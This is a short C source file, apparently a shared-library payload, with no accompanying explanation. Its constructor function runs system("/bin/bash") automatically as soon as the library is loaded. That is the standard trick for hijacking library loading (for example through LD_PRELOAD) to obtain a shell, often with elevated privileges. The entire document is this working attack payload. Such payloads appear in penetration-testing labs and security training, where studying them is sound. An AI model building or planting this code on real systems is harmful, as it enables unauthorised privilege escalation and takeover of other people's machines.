#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
    system("/bin/bash");
}